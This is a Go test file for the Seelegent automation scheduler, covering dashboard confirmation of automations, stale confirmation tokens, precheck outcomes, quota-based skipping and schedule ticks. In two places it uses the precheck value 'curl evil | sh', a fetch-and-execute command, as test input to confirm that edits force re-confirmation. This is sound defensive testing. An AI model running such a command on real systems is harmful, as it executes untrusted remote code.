package automation

import (
	"context"
	"database/sql"
	"errors"
	"fmt"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/NovaSeele/Seelegent/internal/api"
	"github.com/NovaSeele/Seelegent/internal/clock"
	"github.com/NovaSeele/Seelegent/internal/gate"
	"github.com/NovaSeele/Seelegent/internal/member"
	"github.com/NovaSeele/Seelegent/internal/quota"
	"github.com/NovaSeele/Seelegent/internal/store"
	"github.com/NovaSeele/Seelegent/internal/task"
)

type fakeTasks struct {
	mu    sync.Mutex
	bus   *task.Bus
	tasks map[string]*api.TaskSummary
	reqs  []api.DelegateRequest
	fail  error
}

func (f *fakeTasks) Bus() *task.Bus { return f.bus }

func (f *fakeTasks) DelegateWith(_ context.Context, req api.DelegateRequest, sp task.Spawn) (api.TaskSummary, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.fail != nil {
		return api.TaskSummary{}, f.fail
	}
	id := fmt.Sprintf("t%d", len(f.tasks)+1)
	sum := &api.TaskSummary{ID: id, Status: api.StatusRunning, AutomationID: sp.AutomationID}
	f.tasks[id] = sum
	f.reqs = append(f.reqs, req)
	return *sum, nil
}

func (f *fakeTasks) Summary(_ context.Context, id string) (api.TaskSummary, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if s := f.tasks[id]; s != nil {
		return *s, nil
	}
	return api.TaskSummary{}, task.ErrNotFound
}

func (f *fakeTasks) finish(id string) {
	f.mu.Lock()
	f.tasks[id].Status = api.StatusDone
	f.mu.Unlock()
	f.bus.Publish(task.Notice{Kind: task.NoticeTask, TaskID: id})
}

func (f *fakeTasks) count() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return len(f.reqs)
}

type fakeQuota struct {
	mu   sync.Mutex
	rows []AccountQuota
}

func (q *fakeQuota) Quota(context.Context, string, string) ([]AccountQuota, error) {
	q.mu.Lock()
	defer q.mu.Unlock()
	return q.rows, nil
}

func (q *fakeQuota) set(rows ...AccountQuota) {
	q.mu.Lock()
	q.rows = rows
	q.mu.Unlock()
}

type fixture struct {
	s      *Service
	tasks  *fakeTasks
	quota  *fakeQuota
	clock  *clock.Fake
	dir    string
	master bool
	mu     sync.Mutex
	pre    func(cmd string) gate.ExecResult
	events []api.Automation
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	dir := t.TempDir()
	db, err := store.Open(t.Context(), filepath.Join(dir, "seelegent.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = db.Close() })
	f := &fixture{tasks: &fakeTasks{bus: task.NewBus(), tasks: map[string]*api.TaskSummary{}}, quota: &fakeQuota{},
		clock: clock.NewFake(time.Date(2026, 11, 7, 8, 59, 30, 0, time.UTC)), dir: dir, master: true}
	f.s = New(Options{DB: db, Tasks: f.tasks, Quota: f.quota, Clock: f.clock,
		MasterOn: func() bool { f.mu.Lock(); defer f.mu.Unlock(); return f.master },
		Precheck: func(_ context.Context, cmd, _ string, _ time.Duration) gate.ExecResult {
			f.mu.Lock()
			pre := f.pre
			f.mu.Unlock()
			if pre == nil {
				code := 0
				return gate.ExecResult{Exit: &code}
			}
			return pre(cmd)
		},
		ConfirmURL: func(id string) string { return "http://127.0.0.1:1/automations?confirm=" + id },
		Changed: func(a api.Automation) {
			f.mu.Lock()
			f.events = append(f.events, a)
			f.mu.Unlock()
		}})
	t.Cleanup(f.s.Close)
	return f
}

func (f *fixture) create(t *testing.T, in api.AutomationInput) api.Automation {
	t.Helper()
	if in.Prompt == "" {
		in.Prompt = "Update the changelog\nfrom the merged pull requests."
	}
	if in.Cwd == "" {
		in.Cwd = f.dir
	}
	if in.Schedule == (api.Schedule{}) {
		in.Schedule = api.Schedule{Every: api.EveryDaily, At: "09:00"}
	}
	if in.Timezone == "" {
		in.Timezone = "UTC"
	}
	a, err := f.s.Create(t.Context(), in)
	if err != nil {
		t.Fatal(err)
	}
	return a
}

// enable confirms a as the dashboard does.
func (f *fixture) enable(t *testing.T, id string) api.Automation {
	t.Helper()
	shown, err := f.s.Get(t.Context(), id)
	if err != nil {
		t.Fatal(err)
	}
	tok, err := f.s.ConfirmToken(t.Context(), id, shown.Revision)
	if err != nil {
		t.Fatal(err)
	}
	a, err := f.s.Confirm(t.Context(), id, tok.Token)
	if err != nil {
		t.Fatal(err)
	}
	return a
}

func (f *fixture) runs(t *testing.T, id string) []api.AutomationRun {
	t.Helper()
	runs, err := f.s.Runs(t.Context(), id, 0)
	if err != nil {
		t.Fatal(err)
	}
	return runs
}

// tickAndWait ticks at the fake time and waits for the runs it started.
func (f *fixture) tickAndWait(t *testing.T) {
	t.Helper()
	if err := f.s.tick(t.Context()); err != nil {
		t.Fatal(err)
	}
	f.s.wg.Wait()
}

func TestCreateValidation(t *testing.T) {
	f := newFixture(t)
	ctx := t.Context()
	a := f.create(t, api.AutomationInput{Enabled: true})
	if a.Enabled || !a.EnableRequested || a.Name != "Update the changelog" || a.NextRun != "" {
		t.Fatalf("created = %+v", a)
	}
	if a.Quota.MinRemaining != 20 || a.GraceMinutes != 60 || a.Schedule.At != "09:00" {
		t.Fatalf("defaults = %+v", a)
	}
	bad := []api.AutomationInput{
		{Prompt: " ", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily}},
		{Prompt: "x", Cwd: "relative", Schedule: api.Schedule{Every: api.EveryDaily}},
		{Prompt: "x", Cwd: filepath.Join(f.dir, "missing"), Schedule: api.Schedule{Every: api.EveryDaily}},
		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Cron: "* * *"}},
		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Cron: "61 * * * *"}},
		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Cron: "0 6 31 2 *"}},
		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily}, Timezone: "Nowhere/City"},
		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily}, Backend: "gpt"},
		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily},
			Quota: &api.AutomationQuota{MinRemaining: 101}},
		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily}, GraceMinutes: ptr(2000)},
	}
	for i, in := range bad {
		if _, err := f.s.Create(ctx, in); !errors.Is(err, ErrInvalid) {
			t.Errorf("case %d accepted: %v", i, err)
		}
	}
	if _, err := f.s.Get(ctx, "nope"); !errors.Is(err, ErrNotFound) {
		t.Fatalf("get missing: %v", err)
	}
}

func ptr[T any](v T) *T { return &v }

func TestEnableNeedsDashboardConfirmation(t *testing.T) {
	f := newFixture(t)
	ctx := t.Context()
	a := f.create(t, api.AutomationInput{})
	res, err := f.s.RequestEnable(ctx, a.ID)
	if err != nil {
		t.Fatal(err)
	}
	if !res.Confirm || res.Automation.Enabled || !strings.Contains(res.ConfirmURL, a.ID) ||
		!strings.Contains(res.Message, "dashboard") {
		t.Fatalf("enable request = %+v", res)
	}
	got, err := f.s.Update(ctx, a.ID, api.AutomationPatch{Enabled: ptr(true)})
	if err != nil || got.Enabled {
		t.Fatalf("patch enabled = %+v %v", got.Enabled, err)
	}
	if _, err := f.s.Confirm(ctx, a.ID, "made-up"); !errors.Is(err, ErrForbidden) {
		t.Fatalf("made-up token: %v", err)
	}
	if got.Revision == "" {
		t.Fatal("no revision")
	}
	if _, err := f.s.ConfirmToken(ctx, a.ID, ""); !errors.Is(err, ErrInvalid) {
		t.Fatalf("token without a revision: %v", err)
	}
	tok, err := f.s.ConfirmToken(ctx, a.ID, got.Revision)
	if err != nil {
		t.Fatal(err)
	}
	// The automation changes after the token was shown: the token no longer fits.
	changed, err := f.s.Update(ctx, a.ID, api.AutomationPatch{Prompt: ptr("Delete everything")})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.s.Confirm(ctx, a.ID, tok.Token); !errors.Is(err, ErrBadState) {
		t.Fatalf("stale token: %v", err)
	}
	if _, err := f.s.Confirm(ctx, a.ID, tok.Token); !errors.Is(err, ErrForbidden) {
		t.Fatalf("token reused: %v", err)
	}
	// The dashboard still shows the old content: no token for it (F34).
	if changed.Revision == got.Revision {
		t.Fatal("revision did not change with the prompt")
	}
	if _, err := f.s.ConfirmToken(ctx, a.ID, got.Revision); !errors.Is(err, ErrBadState) {
		t.Fatalf("token for a stale revision: %v", err)
	}
	tok, _ = f.s.ConfirmToken(ctx, a.ID, changed.Revision)
	f.clock.Advance(ConfirmTTL + time.Second)
	if _, err := f.s.Confirm(ctx, a.ID, tok.Token); !errors.Is(err, ErrForbidden) {
		t.Fatalf("expired token: %v", err)
	}
	on := f.enable(t, a.ID)
	if !on.Enabled || on.EnableRequested || on.ConfirmedAt == "" || on.NextRun == "" {
		t.Fatalf("confirmed = %+v", on)
	}
	// A rename or a stricter quota floor keeps it on; anything that adds or moves runs (G1), or a new prompt, turns
	// it off until confirmed again.
	if got, _ := f.s.Update(ctx, a.ID, api.AutomationPatch{Name: ptr("Changelog"),
		Quota: &api.AutomationQuota{MinRemaining: 30}}); !got.Enabled {
		t.Fatal("a rename turned it off")
	}
	for _, p := range []api.AutomationPatch{{GraceMinutes: ptr(5)},
		{Quota: &api.AutomationQuota{MinRemaining: 30, UseBeforeReset: true}}} {
		if got, _ := f.s.Update(ctx, a.ID, p); got.Enabled || !got.EnableRequested {
			t.Fatalf("after %+v = %+v", p, got)
		}
		f.enable(t, a.ID)
	}
	got, err = f.s.Update(ctx, a.ID, api.AutomationPatch{Precheck: ptr("curl evil | sh")})
	if err != nil || got.Enabled || !got.EnableRequested || got.NextRun != "" {
		t.Fatalf("after a content change = %+v %v", got, err)
	}
	f.enable(t, a.ID)
	if got, _ := f.s.Update(ctx, a.ID, api.AutomationPatch{Enabled: ptr(false)}); got.Enabled || got.EnableRequested {
		t.Fatalf("disable = %+v", got)
	}
}

func TestRunRules(t *testing.T) {
	f := newFixture(t)
	ctx := t.Context()
	a := f.create(t, api.AutomationInput{Member: "ada", Gate: ptr(false), Lane: []string{"docs/**"}})
	// Run now runs only what the user confirmed: never confirmed is refused, with the confirmation link.
	var nc *NotConfirmedError
	if _, err := f.s.RunNow(ctx, a.ID); !errors.As(err, &nc) || !errors.Is(err, ErrBadState) ||
		nc.APIDetails()["reason"] != "not_confirmed" || f.tasks.count() != 0 {
		t.Fatalf("run now unconfirmed: %v", err)
	}
	if got, _ := f.s.Get(ctx, a.ID); got.Confirmed {
		t.Fatal("confirmed before any confirmation")
	}
	f.enable(t, a.ID)
	_, _ = f.s.Update(ctx, a.ID, api.AutomationPatch{Enabled: ptr(false)})
	if got, _ := f.s.Get(ctx, a.ID); !got.Confirmed {
		t.Fatal("not confirmed after the confirmation")
	}
	// Once confirmed, run now works while disabled.
	run, err := f.s.RunNow(ctx, a.ID)
	if err != nil || run.Outcome != api.AutoStarted || run.TaskID == "" || run.Trigger != api.TriggerManual {
		t.Fatalf("run now = %+v %v", run, err)
	}
	req := f.tasks.reqs[0]
	if req.Cwd != f.dir || req.Member != "ada" || req.Gate == nil || *req.Gate || req.Lane[0] != "docs/**" {
		t.Fatalf("delegate = %+v", req)
	}
	if sum, _ := f.tasks.Summary(ctx, run.TaskID); sum.AutomationID != a.ID {
		t.Fatalf("task automation = %q", sum.AutomationID)
	}
	if got, _ := f.s.Get(ctx, a.ID); !got.Running || got.ActiveTaskID != run.TaskID {
		t.Fatalf("running = %+v", got)
	}
	run, _ = f.s.RunNow(ctx, a.ID)
	if run.Outcome != api.AutoSkippedOverlap || !strings.Contains(run.Detail, "still") || run.Info == nil ||
		run.Info.Reason != api.RunTaskRunning || run.Info.TaskID != "t1" {
		t.Fatalf("overlap = %+v", run)
	}
	f.tasks.finish("t1")

	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "5h", Remaining: 0.1}}},
		AccountQuota{AccountID: "acc2", Windows: []quota.Window{{Window: "5h", Remaining: 0.15}}})
	run, _ = f.s.RunNow(ctx, a.ID)
	if run.Outcome != api.AutoSkippedQuota || !strings.Contains(run.Detail, "15%") || run.Info == nil ||
		run.Info.Remaining == nil || *run.Info.Remaining != 15 || run.Info.MinRemaining != 20 ||
		run.Info.Backend != "agy" {
		t.Fatalf("quota = %+v", run)
	}
	// A window past its reset counts as full.
	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "5h", Remaining: 0.1,
		ResetAt: f.clock.Now().Add(-time.Minute)}}})
	f.mu.Lock()
	f.pre = func(string) gate.ExecResult {
		code := 1
		return gate.ExecResult{Exit: &code, Tail: "nothing new; token=ghp_abcdefghijklmnopqrstuvwxyz0123456789"}
	}
	f.mu.Unlock()
	_, _ = f.s.Update(ctx, a.ID, api.AutomationPatch{Precheck: ptr("git log -1")})
	// A new precheck changes what a run does: confirmed again before run now.
	if _, err := f.s.RunNow(ctx, a.ID); !errors.As(err, &nc) {
		t.Fatalf("run now after a change: %v", err)
	}
	f.enable(t, a.ID)
	// Exit code 1 is the precheck's answer "skip"; anything else is a broken precheck.
	run, _ = f.s.RunNow(ctx, a.ID)
	if run.Outcome != api.AutoSkippedPrecheck || !strings.Contains(run.Detail, "exit code 1") ||
		strings.Contains(run.Detail, "ghp_abc") {
		t.Fatalf("precheck = %+v", run)
	}
	f.mu.Lock()
	f.pre = func(string) gate.ExecResult {
		code := 128
		return gate.ExecResult{Exit: &code, Tail: "fatal: not a git repository"}
	}
	f.mu.Unlock()
	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoPrecheckFailed ||
		!strings.Contains(run.Detail, "exit code 128: fatal") || *run.Info.ExitCode != 128 ||
		!strings.HasPrefix(run.Info.Output, "fatal: ") {
		t.Fatalf("precheck broken = %+v", run)
	}
	f.mu.Lock()
	f.pre = func(string) gate.ExecResult { return gate.ExecResult{TimedOut: true, Err: "timeout after 1m0s"} }
	f.mu.Unlock()
	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoPrecheckFailed || !strings.Contains(run.Detail, "timed out") {
		t.Fatalf("precheck timeout = %+v", run)
	}
	f.mu.Lock()
	f.pre = nil
	f.mu.Unlock()
	f.tasks.fail = errors.New("no usable account")
	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoError || run.Detail != "no usable account" ||
		run.Info.Message != "no usable account" {
		t.Fatalf("error = %+v", run)
	}
	// A member that is gone has a reason the dashboard explains.
	f.tasks.fail = &member.MissingError{ID: "ada"}
	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoError || run.Info.Reason != api.RunMemberMissing ||
		run.Info.Member != "ada" {
		t.Fatalf("member error = %+v", run)
	}
	runs := f.runs(t, a.ID)
	if len(runs) != 8 || runs[0].Outcome != api.AutoError || runs[7].Outcome != api.AutoStarted {
		t.Fatalf("history = %+v", runs)
	}
	if err := f.s.Delete(ctx, a.ID); err != nil {
		t.Fatal(err)
	}
	if _, err := f.s.Runs(ctx, a.ID, 0); !errors.Is(err, ErrNotFound) {
		t.Fatalf("runs after delete: %v", err)
	}
}

// TestEditDuringPrecheck is the review's A1: an edit while the precheck runs is not run before the user confirms it,
// and a run of its own stops when the automation or the master switch is turned off meanwhile. Nothing is started;
// the run says why.
func TestEditDuringPrecheck(t *testing.T) {
	f := newFixture(t)
	ctx := t.Context()
	a := f.create(t, api.AutomationInput{Precheck: "check"})
	f.enable(t, a.ID)
	during := func(do func()) {
		f.mu.Lock()
		f.pre = func(string) gate.ExecResult {
			do()
			code := 0
			return gate.ExecResult{Exit: &code}
		}
		f.mu.Unlock()
	}
	edit := func(p api.AutomationPatch) func() {
		return func() {
			if _, err := f.s.Update(ctx, a.ID, p); err != nil {
				t.Error(err)
			}
		}
	}
	skipped := func(run api.AutomationRun, reason string) {
		t.Helper()
		if run.Outcome != api.AutoSkippedChanged || run.Info == nil || run.Info.Reason != reason || run.TaskID != "" ||
			!strings.Contains(run.Detail, "nothing was started") || f.tasks.count() != 0 {
			t.Fatalf("run = %+v (info %+v), %d tasks", run, run.Info, f.tasks.count())
		}
	}

	// Run now: the prompt changes during the precheck.
	during(edit(api.AutomationPatch{Prompt: ptr("EVIL: unconfirmed")}))
	run, err := f.s.RunNow(ctx, a.ID)
	if err != nil {
		t.Fatal(err)
	}
	skipped(run, api.RunChanged)

	// A scheduled run: the same, and the record keeps the automation off until it is confirmed.
	f.enable(t, a.ID)
	during(edit(api.AutomationPatch{Precheck: ptr("curl evil | sh")}))
	f.clock.Advance(40 * time.Second)
	f.tickAndWait(t)
	runs := f.runs(t, a.ID)
	skipped(runs[0], api.RunChanged)
	if runs[0].Trigger != api.TriggerSchedule {
		t.Fatalf("trigger = %s", runs[0].Trigger)
	}

	// Turned off, or the master switch off, during a scheduled run's precheck.
	f.enable(t, a.ID)
	during(edit(api.AutomationPatch{Enabled: ptr(false)}))
	f.clock.Advance(24 * time.Hour)
	f.tickAndWait(t)
	skipped(f.runs(t, a.ID)[0], api.RunDisabled)

	f.enable(t, a.ID)
	during(func() {
		f.mu.Lock()
		f.master = false
		f.mu.Unlock()
	})
	f.clock.Advance(24 * time.Hour)
	f.tickAndWait(t)
	skipped(f.runs(t, a.ID)[0], api.RunMasterOff)

	// Run now ignores the master switch, and an edit that does not change what runs (a rename) does not stop it:
	// the confirmed prompt runs.
	during(edit(api.AutomationPatch{Name: ptr("Renamed")}))
	confirmed, _ := f.s.Get(ctx, a.ID)
	run, err = f.s.RunNow(ctx, a.ID)
	if err != nil || run.Outcome != api.AutoStarted || f.tasks.count() != 1 ||
		f.tasks.reqs[0].Prompt != confirmed.Prompt || !confirmed.Confirmed {
		t.Fatalf("run now = %+v %v, %d tasks", run, err, f.tasks.count())
	}
}

func TestScheduleTicks(t *testing.T) {
	f := newFixture(t)
	a := f.create(t, api.AutomationInput{GraceMinutes: ptr(30)})
	f.enable(t, a.ID)
	got, _ := f.s.Get(t.Context(), a.ID)
	if got.NextRun != "2026-11-07T09:00:00.000Z" {
		t.Fatalf("next run = %s", got.NextRun)
	}
	f.tickAndWait(t)
	if f.tasks.count() != 0 {
		t.Fatal("ran early")
	}
	f.clock.Advance(40 * time.Second)
	f.tickAndWait(t)
	runs := f.runs(t, a.ID)
	if len(runs) != 1 || runs[0].Trigger != api.TriggerSchedule || runs[0].Outcome != api.AutoStarted {
		t.Fatalf("runs = %+v", runs)
	}
	got, _ = f.s.Get(t.Context(), a.ID)
	if got.NextRun != "2026-11-08T09:00:00.000Z" {
		t.Fatalf("next run = %s", got.NextRun)
	}
	f.tasks.finish("t1")

	// The daemon was off: 20 minutes late is within the grace window (missed), 2 hours is not (skipped_late).
	f.clock.Advance(24*time.Hour + 20*time.Minute)
	f.tickAndWait(t)
	if runs = f.runs(t, a.ID); runs[0].Trigger != api.TriggerMissed || runs[0].Outcome != api.AutoStarted {
		t.Fatalf("missed run = %+v", runs[0])
	}
	f.tasks.finish("t2")
	f.clock.Advance(24*time.Hour + 2*time.Hour)
	f.tickAndWait(t)
	if runs = f.runs(t, a.ID); runs[0].Outcome != api.AutoSkippedLate || f.tasks.count() != 2 ||
		runs[0].Info.LateMinutes != 140 || runs[0].Info.GraceMinutes != 30 ||
		runs[0].Detail != "missed by 2h20m0s (grace 30 min)" {
		t.Fatalf("late run = %+v", runs[0])
	}
	// The master switch off: the schedule moves on, nothing runs or is recorded.
	f.mu.Lock()
	f.master = false
	f.mu.Unlock()
	f.clock.Advance(24 * time.Hour)
	f.tickAndWait(t)
	if n := len(f.runs(t, a.ID)); n != 3 || f.tasks.count() != 2 {
		t.Fatalf("ran with the master switch off: %d runs", n)
	}
}

// TestPendingRunSurvivesStop is the review's G3: the tick moves the next run time and writes a pending run in one
// transaction, so a stop before the run starts leaves a trace the next start resolves, not a silently lost run.
func TestPendingRunSurvivesStop(t *testing.T) {
	f := newFixture(t)
	a := f.create(t, api.AutomationInput{Precheck: "wait"})
	f.enable(t, a.ID)
	release := make(chan struct{})
	started := make(chan struct{})
	f.mu.Lock()
	f.pre = func(string) gate.ExecResult {
		close(started)
		<-release
		code := 1
		return gate.ExecResult{Exit: &code}
	}
	f.mu.Unlock()
	f.clock.Advance(40 * time.Second)
	if err := f.s.tick(t.Context()); err != nil {
		t.Fatal(err)
	}
	<-started
	// The run is starting: the history and the last run say pending, and the next run time has moved on.
	got, _ := f.s.Get(t.Context(), a.ID)
	runs := f.runs(t, a.ID)
	if len(runs) != 1 || runs[0].Outcome != api.AutoPending || got.LastRun == nil ||
		got.LastRun.Outcome != api.AutoPending || got.NextRun != "2026-11-08T09:00:00.000Z" {
		t.Fatalf("while starting: runs %+v, automation %+v", runs, got)
	}
	// The daemon stops here; the next start resolves the row.
	if err := f.s.o.DB.Write(t.Context(), func(tx *sql.Tx) error { return f.s.resolvePending(t.Context(), tx) }); err != nil {
		t.Fatal(err)
	}
	got, _ = f.s.Get(t.Context(), a.ID)
	runs = f.runs(t, a.ID)
	if len(runs) != 1 || runs[0].Outcome != api.AutoError || runs[0].Detail != interruptedRun ||
		got.LastRun.Outcome != api.AutoError {
		t.Fatalf("after a stop: runs %+v, last %+v", runs, got.LastRun)
	}
	close(release)
	f.s.wg.Wait()
	// The same row ends with the run's own outcome: one row per run.
	if runs = f.runs(t, a.ID); len(runs) != 1 || runs[0].Outcome != api.AutoSkippedPrecheck {
		t.Fatalf("runs = %+v", runs)
	}
}

func TestBeforeReset(t *testing.T) {
	f := newFixture(t)
	a := f.create(t, api.AutomationInput{Schedule: api.Schedule{Every: api.EveryWeekly},
		Quota: &api.AutomationQuota{MinRemaining: 50, UseBeforeReset: true}})
	f.enable(t, a.ID)
	reset := f.clock.Now().Add(10 * time.Hour)
	// The 5 h window is low, the weekly one about to reset has 45 % left: judged on the weekly bucket (D9), 45 %
	// is under minRemaining 50, so the run is skipped and the bucket stays unused.
	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "5h", Remaining: 0.9},
		{Window: "weekly", Remaining: 0.45, ResetAt: reset}}})
	f.tickAndWait(t)
	runs := f.runs(t, a.ID)
	if len(runs) != 1 || runs[0].Trigger != api.TriggerBeforeReset || runs[0].Outcome != api.AutoSkippedQuota {
		t.Fatalf("runs = %+v", runs)
	}
	// Not tried again at once.
	f.clock.Advance(time.Minute)
	f.tickAndWait(t)
	if n := len(f.runs(t, a.ID)); n != 1 {
		t.Fatalf("retried at once: %d runs", n)
	}
	// Later, with more left, it runs once for this bucket.
	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "5h", Remaining: 0.9},
		{Window: "weekly", Remaining: 0.7, ResetAt: reset}}})
	f.clock.Advance(beforeResetRetry)
	f.tickAndWait(t)
	if runs = f.runs(t, a.ID); runs[0].Outcome != api.AutoStarted || runs[0].Trigger != api.TriggerBeforeReset {
		t.Fatalf("before reset = %+v", runs[0])
	}
	f.tasks.finish("t1")
	f.clock.Advance(time.Hour)
	f.tickAndWait(t)
	if f.tasks.count() != 1 {
		t.Fatal("ran twice for one bucket")
	}
	// A bucket that resets in more than 24 h, or with under 40 % left, does not count.
	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "weekly", Remaining: 0.9,
		ResetAt: f.clock.Now().Add(30 * time.Hour)}}})
	f.tickAndWait(t)
	if f.tasks.count() != 1 {
		t.Fatal("ran for a far reset")
	}
}

func TestSchedulerLoop(t *testing.T) {
	f := newFixture(t)
	a := f.create(t, api.AutomationInput{})
	f.enable(t, a.ID)
	if err := f.s.Start(t.Context()); err != nil {
		t.Fatal(err)
	}
	if !f.clock.WaitTimers(1, 5*time.Second) {
		t.Fatal("no timer armed")
	}
	f.clock.Advance(31 * time.Second) // 09:00:01
	deadline := time.Now().Add(5 * time.Second)
	for f.tasks.count() == 0 {
		if time.Now().After(deadline) {
			t.Fatal("the loop did not run the automation")
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func TestPreview(t *testing.T) {
	f := newFixture(t)
	p, err := f.s.Preview(api.SchedulePreviewRequest{Schedule: api.Schedule{Every: api.EveryWeekdays, At: "09:00"},
		Timezone: "Asia/Tokyo", Count: 3})
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"2026-11-09T00:00:00.000Z", "2026-11-10T00:00:00.000Z", "2026-11-11T00:00:00.000Z"}
	if strings.Join(p.Runs, ",") != strings.Join(want, ",") || !strings.HasPrefix(p.Local[0], "2026-11-09 09:00 Mon") {
		t.Fatalf("preview = %+v", p)
	}
	if _, err := f.s.Preview(api.SchedulePreviewRequest{Schedule: api.Schedule{Cron: "bad"}}); !errors.Is(err, ErrInvalid) {
		t.Fatalf("bad cron: %v", err)
	}
}
